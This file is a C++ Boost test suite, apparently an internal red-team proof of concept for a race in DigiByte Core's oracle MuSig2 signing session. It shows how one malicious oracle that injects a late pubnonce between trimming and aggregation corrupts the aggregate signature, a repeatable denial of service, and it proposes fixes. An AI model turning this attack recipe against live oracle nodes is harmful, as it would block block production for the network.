// Copyright (c) 2026 The DigiByte Core developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or http://www.opensource.org/licenses/mit-license.php.

/**
 * RH-57: MuSig2 TOCTOU race between TrimNoncesToThreshold and
 *        AggregateNonces — pubnonce injection between Trim and Aggregate
 *        (Wave-5 adversarial PoC — oracle signing-session attack)
 *
 * Target: src/oracle/musig2_session.cpp
 *           TrimNoncesToThreshold  :248-261
 *           AggregateNonces        :263-295
 *           AddPubnonce            :179-213
 *
 * Caller:  src/oracle/signing_orchestrator.cpp::TickEpochSession
 *            :346-520 — calls Trim → SetKeyAggCache → AggregateNonces
 *            WITHOUT holding OracleSigningOrchestrator::m_sessions_mutex
 *            around the 4-step critical section.
 *
 * Concurrent entrypoint: src/net_processing.cpp:6095
 *            g_signing_orchestrator->IngestRemoteNonce(nonce_msg)
 *              — takes m_sessions_mutex, calls AddPubnonce on the same
 *            session under the per-session m_mutex.
 *
 * ─────────────────────────────────────────────────────────────────────
 * The bug in one paragraph
 * ─────────────────────────────────────────────────────────────────────
 * `TickEpochSession` performs an unserialised 4-step dance on a shared
 * `MuSig2SigningSession*`:
 *     (1) session->TrimNoncesToThreshold()        [takes m_mutex, releases]
 *     (2) GetNonceParticipants() + ComputeAggregatePubkey(ids)  [no lock]
 *     (3) session->SetKeyAggCache(part_cache)     [takes m_mutex, releases]
 *     (4) session->AggregateNonces(msg32)         [takes m_mutex, releases]
 *
 * Between steps (1) and (4) the per-session lock is released three times.
 * During any of those windows a concurrent P2P `IngestRemoteNonce` may
 * call `AddPubnonce(oracle_id, pubnonce)`. `AddPubnonce` accepts as
 * long as:
 *   - state ∈ {NONCES_COLLECTING, NONCES_COMPLETE}   (it is NONCES_COMPLETE
 *     after step 1 — Trim does NOT change state)
 *   - oracle_id is not already in `m_pubnonces`        (holds — that id was
 *     trimmed in step 1, or was never in the set)
 *   - oracle_id < nOracleTotalOracles                   (holds for a real oracle)
 *   - pubnonce magic bytes == {0xf5,0x7a,0x3d,0xa0}    (holds for a parsed pn)
 * So the late pubnonce is admitted.
 *
 * In step (4) `AggregateNonces` iterates `m_pubnonces` and passes ALL of
 * them to `secp256k1_musig_nonce_agg` — including the late one. The
 * keyagg cache, however, was computed in step (2) over the trimmed
 * participant set and does NOT include the late oracle.
 *
 * Result: the local partial sig is produced against a (4-key, 5-nonce)
 * session. Whatever the miner publishes, validators will not be able to
 * reconstruct: the on-chain participation bitmap encodes a set that
 * disagrees with the aggregator. BIP-340 verify returns 0 — the block is
 * rejected. Every epoch, repeatable DoS.
 *
 * The attacker needs control of ONE authenticated oracle node. The
 * outer OracleMusigNonceMsg auth-sig at bundle_manager.cpp:1698 only
 * proves the message came from oracle_id's keypair (which the attacker
 * owns); it says nothing about WHEN the nonce arrived w.r.t. the local
 * Trim/Aggregate dance. An attacker who deliberately withholds nonces
 * until the quorum is already reached, then races the submission to
 * arrive between steps (1)-(4), reliably corrupts the aggregate.
 *
 * ─────────────────────────────────────────────────────────────────────
 * Why this is NEW vs. W1-W4 + C1-C4 + H1-H8 + M1-M5 + rh01..rh56
 * ─────────────────────────────────────────────────────────────────────
 *   - W3-H-01 (rh55) targeted AddPartialSignature (unverified scalar on
 *     the PARTIAL-SIG path). Patched via AddPartialSignatureVerified.
 *     THIS attack is on the NONCE path (AddPubnonce) and targets the
 *     participant-set mismatch between the keyagg cache and the
 *     aggnonce — a different primitive.
 *   - W4-L-01 (rh56) targeted ExtractOracleBundle bitmap inflation —
 *     different surface.
 *   - musig2_p2p_network_attacks_tests::test_trim_then_late_partial_sig
 *     exercises a LATE PARTIAL SIG arriving after Trim. The defense
 *     (`if (m_pubnonces.find(oracle_id) == m_pubnonces.end()) return false`)
 *     at musig2_session.cpp:364 blocks that attack. The DEFENCE DOES NOT
 *     APPLY to AddPubnonce, which lacks any such "were you in the trimmed
 *     set?" check — it only rejects duplicates (oracle-ID-already-present),
 *     not late-arriving out-of-set nonces.
 *   - C1-C4 (DD validation / ERR / Tapscript / CScriptNum) untouched.
 *   - H1-H8, M1-M5 untouched.
 *   - RH52 (BIP34 CScriptNum), RH53 (OP_CHECKPRICE mock), RH54 (OP_ORACLE
 *     OP_SUCCESS), RH56 (bitmap) — none touch the Trim/Aggregate race.
 *
 * ─────────────────────────────────────────────────────────────────────
 * Impact
 * ─────────────────────────────────────────────────────────────────────
 *   Severity: HIGH (network-level DoS on oracle attestation)
 *   A single malicious authenticated oracle can indefinitely block
 *   Phase-3 oracle signing by deliberately late-submitting a valid
 *   pubnonce after the local orchestrator has already Trimmed. The
 *   resulting aggregate does not verify under the bitmap-derived
 *   keyagg, so every miner's proposed block is rejected. Repeats
 *   every epoch. No rate-limit exists on AddPubnonce's "late arrival"
 *   path.
 *
 * Fix direction (NOT applied in this file — defender wave will decide):
 *   Either (a) make the Trim → ComputeAggregatePubkey →
 *   SetKeyAggCache → AggregateNonces sequence atomic under one lock
 *   (new MuSig2SigningSession helper method that does all four steps
 *   internally under m_mutex), OR (b) freeze `m_pubnonces` when
 *   TrimNoncesToThreshold is called (transition to a new state, e.g.,
 *   NONCES_FROZEN; AddPubnonce rejects that state).
 */

#include <boost/test/unit_test.hpp>

#include <chainparams.h>
#include <key.h>
#include <random.h>
#include <test/util/setup_common.h>

#include <oracle/musig2_session.h>

#include <secp256k1.h>
#include <secp256k1_extrakeys.h>
#include <secp256k1_musig.h>
#include <secp256k1_schnorrsig.h>

#include <cstring>
#include <vector>

BOOST_FIXTURE_TEST_SUITE(rh57_musig2_trim_aggregate_toctou_tests, BasicTestingSetup)

static bool MakeKp(secp256k1_context* ctx,
                   unsigned char sk[32],
                   secp256k1_keypair* kp,
                   secp256k1_pubkey* pk)
{
    GetStrongRandBytes(Span{sk, 32});
    if (!secp256k1_keypair_create(ctx, kp, sk)) return false;
    if (!secp256k1_keypair_pub(ctx, pk, kp)) return false;
    return true;
}

static CKey MakeCKey(const unsigned char sk[32])
{
    CKey k;
    k.Set(sk, sk + 32, true);
    return k;
}

/**
 * Compute the MuSig2 keyagg cache over an arbitrary participant set
 * defined by pubkey pointers, in sorted BIP-327 order. Mimics what
 * MuSig2OracleAggregator::ComputeAggregatePubkey does internally.
 */
static bool KeyAgg(secp256k1_context* ctx,
                   const std::vector<const secp256k1_pubkey*>& pks,
                   secp256k1_xonly_pubkey& agg_pk_out,
                   secp256k1_musig_keyagg_cache& cache_out)
{
    return secp256k1_musig_pubkey_agg(ctx, &agg_pk_out, &cache_out,
                                      pks.data(), pks.size()) != 0;
}

/**
 * CASE 1 — end-to-end reproduction of the TOCTOU race on a single
 *          session object.
 *
 * Interleaving reproduced:
 *   (A) Collect 7 pubnonces (oracle_ids 0..6); state -> NONCES_COMPLETE.
 *   (B) Simulate orchestrator step 1: TrimNoncesToThreshold() -> 4
 *       pubnonces {0,1,2,3}; state stays NONCES_COMPLETE.
 *   (C) Orchestrator step 2: KeyAgg over {0,1,2,3} computed here (same
 *       operation MuSig2OracleAggregator would do).
 *   (D) RACE: before step 3/4, attacker slips an AddPubnonce(4, pn4).
 *       The session accepts it because:
 *             state is NONCES_COMPLETE (allowed)
 *             4 < nOracleTotalOracles (regtest=7)
 *             4 is not already in m_pubnonces (was trimmed)
 *             magic bytes on the pubnonce are the legit f5 7a 3d a0
 *             NO "was this id in the trimmed set?" check exists
 *   (E) Orchestrator step 3: SetKeyAggCache({0,1,2,3} cache).
 *   (F) Orchestrator step 4: AggregateNonces(msg32). Internally it
 *       iterates m_pubnonces — now 5 of them — and aggregates. The
 *       session is initialised bound to a 4-key keyagg_cache but a
 *       5-nonce aggnonce.
 *
 * Demonstrating concrete harm: every local signer produces a partial
 * sig via this session, but the eventually-assembled 64-byte aggregate
 * does NOT verify under the correct bitmap-derived aggregate pubkey
 * (which validators reconstruct over {0,1,2,3}). `schnorrsig_verify`
 * returns 0 — block-level consensus rejection — every epoch.
 */
BOOST_AUTO_TEST_CASE(rh57_trim_then_late_pubnonce_corrupts_aggregate)
{
    secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    BOOST_REQUIRE(ctx != nullptr);

    // Pick N and T small enough to work under BOTH mainnet (17 oracles,
    // threshold 9) and regtest (7 oracles, threshold 4) chainparams —
    // AddPubnonce's `oracle_id < nOracleTotalOracles` range check
    // (musig2_session.cpp:195) is the only chainparams-dependent gate
    // in the race, and oracle_id values 0..6 pass on both chains.
    constexpr size_t N = 7;
    constexpr uint8_t T = 4;

    // Document the consensus parameters the attack assumes. AddPubnonce
    // reads total_oracles from chainparams; as long as our oracle_ids
    // stay in [0, total_oracles), the race is reachable identically.
    const auto& cp = Params().GetConsensus();
    BOOST_REQUIRE_GE(cp.nOracleTotalOracles, static_cast<int>(N));

    // Generate 7 real oracle keypairs.
    unsigned char sks[N][32];
    secp256k1_keypair kps[N];
    secp256k1_pubkey  pks[N];
    for (size_t i = 0; i < N; i++) {
        BOOST_REQUIRE(MakeKp(ctx, sks[i], &kps[i], &pks[i]));
    }

    std::vector<const secp256k1_pubkey*> pk_ptrs_all(N);
    for (size_t i = 0; i < N; i++) pk_ptrs_all[i] = &pks[i];

    // Full-set key aggregation (oracle 0..6) — orchestrator step 1's
    // "all_oracle_ids" keyagg at signing_orchestrator.cpp:379.
    secp256k1_xonly_pubkey agg_pk_all;
    secp256k1_musig_keyagg_cache cache_all;
    BOOST_REQUIRE(KeyAgg(ctx, pk_ptrs_all, agg_pk_all, cache_all));

    // ────────────────────────────────────────────────────────
    // Phase 1: collect all 7 pubnonces (oracle_ids 0..6)
    // ────────────────────────────────────────────────────────
    MuSig2SigningSession session(/*epoch=*/42, /*min_signers=*/T);
    BOOST_CHECK(session.GetState() == MuSig2SessionState::CREATED);

    // Local oracle is id=0 (use GenerateNonce so the session tracks
    // a secnonce for local partial sig creation later).
    CKey ck0 = MakeCKey(sks[0]);
    secp256k1_musig_pubnonce pn_local;
    BOOST_REQUIRE(session.GenerateNonce(0, ck0, pks[0], cache_all, pn_local));
    BOOST_CHECK(session.GetState() == MuSig2SessionState::NONCES_COLLECTING);

    // Remote oracles 1..6: generate externally and submit as if from P2P.
    secp256k1_musig_secnonce  ext_sn[N];
    secp256k1_musig_pubnonce  ext_pn[N];
    ext_pn[0] = pn_local;
    for (size_t i = 1; i < N; i++) {
        unsigned char rnd[32];
        GetStrongRandBytes(Span{rnd, 32});
        BOOST_REQUIRE(secp256k1_musig_nonce_gen(ctx, &ext_sn[i], &ext_pn[i],
                                                rnd, sks[i], &pks[i],
                                                nullptr, &cache_all, nullptr));
    }

    for (size_t i = 0; i < N; i++) {
        BOOST_CHECK(session.AddPubnonce(static_cast<uint8_t>(i), ext_pn[i]));
    }
    BOOST_CHECK(session.HasEnoughNonces());
    BOOST_CHECK(session.GetState() == MuSig2SessionState::NONCES_COMPLETE);
    BOOST_CHECK_EQUAL(session.GetNonceCount(), N);

    // ────────────────────────────────────────────────────────
    // Phase 2: orchestrator step 1 — TrimNoncesToThreshold
    // Drops oracle_ids 4,5,6; keeps {0,1,2,3}.
    // CRITICAL: state is NOT changed. Still NONCES_COMPLETE.
    // ────────────────────────────────────────────────────────
    session.TrimNoncesToThreshold();
    BOOST_CHECK_EQUAL(session.GetNonceCount(), static_cast<size_t>(T));
    BOOST_CHECK(session.GetState() == MuSig2SessionState::NONCES_COMPLETE);

    std::vector<uint8_t> trimmed_ids = session.GetNonceParticipants();
    BOOST_REQUIRE_EQUAL(trimmed_ids.size(), static_cast<size_t>(T));
    BOOST_CHECK_EQUAL(trimmed_ids[0], 0);
    BOOST_CHECK_EQUAL(trimmed_ids[1], 1);
    BOOST_CHECK_EQUAL(trimmed_ids[2], 2);
    BOOST_CHECK_EQUAL(trimmed_ids[3], 3);

    // ────────────────────────────────────────────────────────
    // Phase 3: orchestrator step 2 — compute participants-only keyagg
    // over {0,1,2,3} ONLY. This is the cache that validators will
    // reconstruct from the on-chain bitmap.
    // ────────────────────────────────────────────────────────
    std::vector<const secp256k1_pubkey*> pk_ptrs_trim;
    for (uint8_t id : trimmed_ids) pk_ptrs_trim.push_back(&pks[id]);
    secp256k1_xonly_pubkey agg_pk_trim;
    secp256k1_musig_keyagg_cache cache_trim;
    BOOST_REQUIRE(KeyAgg(ctx, pk_ptrs_trim, agg_pk_trim, cache_trim));

    // ────────────────────────────────────────────────────────
    // Phase 4: ★ THE RACE ★
    //
    // Attacker submits oracle 4's (previously-trimmed) pubnonce BEFORE
    // the orchestrator reaches AggregateNonces. AddPubnonce admits it
    // because nothing in its check set notices that 4 was trimmed or
    // that the orchestrator has already decided on a participant set.
    // ────────────────────────────────────────────────────────
    bool late_accepted = session.AddPubnonce(4, ext_pn[4]);
    BOOST_CHECK_MESSAGE(late_accepted,
        "RH-57 exploit precondition: AddPubnonce MUST accept a late "
        "pubnonce between Trim and Aggregate — it has no defense.");
    BOOST_CHECK_EQUAL(session.GetNonceCount(), static_cast<size_t>(T + 1));

    // ────────────────────────────────────────────────────────
    // Phase 5: orchestrator step 3 — SetKeyAggCache to the 4-key cache
    //          orchestrator step 4 — AggregateNonces(msg32)
    // ────────────────────────────────────────────────────────
    session.SetKeyAggCache(cache_trim);

    unsigned char msg32[32];
    GetStrongRandBytes(Span{msg32, 32});

    bool agg_ok = session.AggregateNonces(msg32);
    BOOST_CHECK_MESSAGE(agg_ok,
        "Session proceeds to SIGNING state even though the aggnonce was "
        "built from 5 pubnonces and the keyagg cache represents only 4 "
        "participants — the mismatch is silent.");
    BOOST_CHECK(session.GetState() == MuSig2SessionState::SIGNING);

    // ────────────────────────────────────────────────────────
    // Phase 6: complete the signing protocol and show the aggregate
    //          does NOT verify under the 4-participant aggregate
    //          pubkey that validators reconstruct from the bitmap.
    // ────────────────────────────────────────────────────────
    // Local (oracle 0) partial sig via the session's own API.
    secp256k1_musig_partial_sig psig0;
    BOOST_REQUIRE(session.CreatePartialSignature(0, ck0, psig0));
    BOOST_CHECK(session.AddPartialSignature(0, psig0));

    // Remote oracles 1..3 partial sigs via the raw secp256k1 API, using
    // the same corrupted session state (aggnonce over 5, cache over 4).
    // To produce these externally we replay the orchestrator's internal
    // state — aggnonce over all 5 pubnonces, cache over 4 participants.
    std::vector<const secp256k1_musig_pubnonce*> pn_corr_ptrs;
    for (uint8_t id : trimmed_ids) pn_corr_ptrs.push_back(&ext_pn[id]);
    pn_corr_ptrs.push_back(&ext_pn[4]);  // the raced-in late nonce
    BOOST_CHECK_EQUAL(pn_corr_ptrs.size(), static_cast<size_t>(T + 1));

    secp256k1_musig_aggnonce aggn_corr;
    BOOST_REQUIRE(secp256k1_musig_nonce_agg(ctx, &aggn_corr,
                                            pn_corr_ptrs.data(),
                                            pn_corr_ptrs.size()));
    secp256k1_musig_session raw_sess;
    BOOST_REQUIRE(secp256k1_musig_nonce_process(ctx, &raw_sess, &aggn_corr,
                                                msg32, &cache_trim));

    // Remote partial sigs from oracles 1,2,3 produced against the same
    // corrupted raw session. Each oracle dutifully signs — they're
    // honest, they have no way to see the orchestrator's keyagg/aggnonce
    // mismatch.
    for (uint8_t id : {1, 2, 3}) {
        secp256k1_musig_partial_sig psig;
        BOOST_REQUIRE(secp256k1_musig_partial_sign(ctx, &psig, &ext_sn[id],
                                                   &kps[id], &cache_trim,
                                                   &raw_sess));
        BOOST_CHECK(session.AddPartialSignature(id, psig));
    }

    BOOST_CHECK(session.HasEnoughPartialSigs());

    std::vector<unsigned char> sig64;
    bool final_agg_ok = session.AggregateSignature(sig64);
    BOOST_CHECK(final_agg_ok);
    BOOST_CHECK_EQUAL(sig64.size(), 64u);

    // ★ THE HARM ★
    // Validator reconstructs aggregate pubkey from the bitmap {0,1,2,3}
    // and verifies the 64-byte sig against msg32. Because the miner's
    // aggnonce carries contributions from 5 secnonces but the
    // participants-only cache + pubkey are for 4, the sig fails BIP-340
    // Schnorr verification. Block-level rejection.
    int verify_under_trimmed = secp256k1_schnorrsig_verify(
        ctx, sig64.data(), msg32, 32, &agg_pk_trim);

    // Defensive: also check against the full-set aggregate in case
    // someone argues "well, maybe it verifies under the full cache".
    int verify_under_full = secp256k1_schnorrsig_verify(
        ctx, sig64.data(), msg32, 32, &agg_pk_all);

    BOOST_CHECK_MESSAGE(verify_under_trimmed == 0,
        "RH-57 CONFIRMED: corrupted aggregate fails Schnorr verify under "
        "the validator-reconstructed (4-participant) aggregate pubkey. "
        "Per-epoch DoS on oracle attestation.");
    BOOST_CHECK_MESSAGE(verify_under_full == 0,
        "Sanity: corrupted aggregate also fails under full-set pubkey — "
        "the sig is just plain broken, not merely addressed to the wrong "
        "aggregator.");

    BOOST_TEST_MESSAGE("rh57 CONFIRMED: Trim→Aggregate TOCTOU — late "
                       "AddPubnonce produces a non-verifying aggregate. "
                       "Schnorr verify under trimmed aggregate pubkey = "
                       << verify_under_trimmed
                       << "; under full aggregate pubkey = "
                       << verify_under_full);

    secp256k1_context_destroy(ctx);
}

/**
 * CASE 2 — minimal state-machine assertion: document that TrimNonces
 *          does NOT freeze the pubnonce set and does NOT change the
 *          session state, so no AddPubnonce predicate observes the
 *          "we've already decided on the participant set" moment.
 */
BOOST_AUTO_TEST_CASE(rh57_trim_does_not_freeze_pubnonces)
{
    secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    BOOST_REQUIRE(ctx != nullptr);

    constexpr size_t N = 7;
    constexpr uint8_t T = 4;

    unsigned char sks[N][32];
    secp256k1_keypair kps[N];
    secp256k1_pubkey  pks[N];
    for (size_t i = 0; i < N; i++) BOOST_REQUIRE(MakeKp(ctx, sks[i], &kps[i], &pks[i]));

    std::vector<const secp256k1_pubkey*> pk_ptrs(N);
    for (size_t i = 0; i < N; i++) pk_ptrs[i] = &pks[i];
    secp256k1_xonly_pubkey agg_pk;
    secp256k1_musig_keyagg_cache cache;
    BOOST_REQUIRE(KeyAgg(ctx, pk_ptrs, agg_pk, cache));

    MuSig2SigningSession session(/*epoch=*/43, /*min_signers=*/T);

    // Fill all 7 pubnonces so state is NONCES_COMPLETE.
    CKey ck0 = MakeCKey(sks[0]);
    secp256k1_musig_pubnonce pn_local;
    BOOST_REQUIRE(session.GenerateNonce(0, ck0, pks[0], cache, pn_local));

    secp256k1_musig_secnonce ext_sn[N];
    secp256k1_musig_pubnonce ext_pn[N];
    ext_pn[0] = pn_local;
    for (size_t i = 1; i < N; i++) {
        unsigned char rnd[32];
        GetStrongRandBytes(Span{rnd, 32});
        BOOST_REQUIRE(secp256k1_musig_nonce_gen(ctx, &ext_sn[i], &ext_pn[i],
                                                rnd, sks[i], &pks[i],
                                                nullptr, &cache, nullptr));
    }
    for (uint8_t i = 0; i < N; i++) BOOST_CHECK(session.AddPubnonce(i, ext_pn[i]));
    BOOST_CHECK(session.GetState() == MuSig2SessionState::NONCES_COMPLETE);

    // Trim to threshold.
    session.TrimNoncesToThreshold();

    // Invariant 1: state is still NONCES_COMPLETE (not a new FROZEN / SELECTED state).
    BOOST_CHECK_MESSAGE(session.GetState() == MuSig2SessionState::NONCES_COMPLETE,
        "RH-57: TrimNoncesToThreshold does not transition to a new "
        "participant-set-frozen state — AddPubnonce still accepts late "
        "arrivals.");

    // Invariant 2: every trimmed oracle id can re-enter via AddPubnonce.
    // This is the direct attacker primitive.
    for (uint8_t id : {4, 5, 6}) {
        bool ok = session.AddPubnonce(id, ext_pn[id]);
        BOOST_CHECK_MESSAGE(ok,
            "RH-57: late AddPubnonce for trimmed oracle_id "
            << (int)id << " is accepted — no defense in depth.");
    }
    BOOST_CHECK_EQUAL(session.GetNonceCount(), static_cast<size_t>(N));

    secp256k1_context_destroy(ctx);
}

/**
 * CASE 3 — documentary: demonstrate that `AddPartialSignature` DOES have
 *          a participant-set check (`m_pubnonces.find(oracle_id)`) at
 *          musig2_session.cpp:364. That check is what blocks the
 *          sibling "late partial sig" attack in musig2_p2p_network_attacks_tests.
 *          AddPubnonce LACKS that layer entirely. The fix to this race
 *          must introduce the same "frozen participant set" concept on
 *          the nonce side.
 */
BOOST_AUTO_TEST_CASE(rh57_defense_asymmetry_partial_vs_nonce)
{
    secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    BOOST_REQUIRE(ctx != nullptr);

    constexpr size_t N = 7;
    constexpr uint8_t T = 4;

    unsigned char sks[N][32];
    secp256k1_keypair kps[N];
    secp256k1_pubkey  pks[N];
    for (size_t i = 0; i < N; i++) BOOST_REQUIRE(MakeKp(ctx, sks[i], &kps[i], &pks[i]));
    std::vector<const secp256k1_pubkey*> pkp(N);
    for (size_t i = 0; i < N; i++) pkp[i] = &pks[i];
    secp256k1_xonly_pubkey agg_pk;
    secp256k1_musig_keyagg_cache cache_all;
    BOOST_REQUIRE(KeyAgg(ctx, pkp, agg_pk, cache_all));

    MuSig2SigningSession session(/*epoch=*/44, /*min_signers=*/T);

    CKey ck0 = MakeCKey(sks[0]);
    secp256k1_musig_pubnonce pn_local;
    BOOST_REQUIRE(session.GenerateNonce(0, ck0, pks[0], cache_all, pn_local));

    secp256k1_musig_secnonce ext_sn[N];
    secp256k1_musig_pubnonce ext_pn[N];
    ext_pn[0] = pn_local;
    for (size_t i = 1; i < N; i++) {
        unsigned char rnd[32];
        GetStrongRandBytes(Span{rnd, 32});
        BOOST_REQUIRE(secp256k1_musig_nonce_gen(ctx, &ext_sn[i], &ext_pn[i],
                                                rnd, sks[i], &pks[i],
                                                nullptr, &cache_all, nullptr));
    }
    for (uint8_t i = 0; i < N; i++) BOOST_CHECK(session.AddPubnonce(i, ext_pn[i]));

    session.TrimNoncesToThreshold();  // keeps {0,1,2,3}

    // Participants-only cache for the trimmed set.
    std::vector<const secp256k1_pubkey*> pkp_tr;
    for (uint8_t id : {0,1,2,3}) pkp_tr.push_back(&pks[id]);
    secp256k1_xonly_pubkey agg_pk_tr;
    secp256k1_musig_keyagg_cache cache_tr;
    BOOST_REQUIRE(KeyAgg(ctx, pkp_tr, agg_pk_tr, cache_tr));

    session.SetKeyAggCache(cache_tr);

    unsigned char msg32[32];
    GetStrongRandBytes(Span{msg32, 32});
    BOOST_REQUIRE(session.AggregateNonces(msg32));
    BOOST_CHECK(session.GetState() == MuSig2SessionState::SIGNING);

    // ── Defense on partial-sig path (see musig2_session.cpp:364): oracle 4
    // was trimmed and no longer in m_pubnonces, so a partial sig from it is
    // rejected at AddPartialSignature.
    // Produce a valid (under cache_tr/raw_sess) partial sig from oracle 4
    // to isolate the "participant-set" rejection from other failures.
    std::vector<const secp256k1_musig_pubnonce*> pnp_tr;
    for (uint8_t id : {0,1,2,3}) pnp_tr.push_back(&ext_pn[id]);
    secp256k1_musig_aggnonce aggn_tr;
    BOOST_REQUIRE(secp256k1_musig_nonce_agg(ctx, &aggn_tr, pnp_tr.data(), 4));
    secp256k1_musig_session raw_sess_tr;
    BOOST_REQUIRE(secp256k1_musig_nonce_process(ctx, &raw_sess_tr, &aggn_tr,
                                                msg32, &cache_tr));

    // Oracle 4 crafts a sig against the trimmed session it wasn't invited
    // to. The raw secp256k1 API will happily produce one — the defense
    // lives in our higher-level AddPartialSignature.
    secp256k1_musig_partial_sig psig4;
    bool sigfor4 = secp256k1_musig_partial_sign(ctx, &psig4, &ext_sn[4],
                                                &kps[4], &cache_tr,
                                                &raw_sess_tr);
    BOOST_CHECK(sigfor4);

    bool ps_rejected = !session.AddPartialSignature(4, psig4);
    BOOST_CHECK_MESSAGE(ps_rejected,
        "RH-57 defense evidence: AddPartialSignature has a participant-set "
        "check (musig2_session.cpp:364) that rejects partial sigs from "
        "oracles not in m_pubnonces. AddPubnonce LACKS this layer — that's "
        "the fix target.");

    secp256k1_context_destroy(ctx);
}

BOOST_AUTO_TEST_SUITE_END()
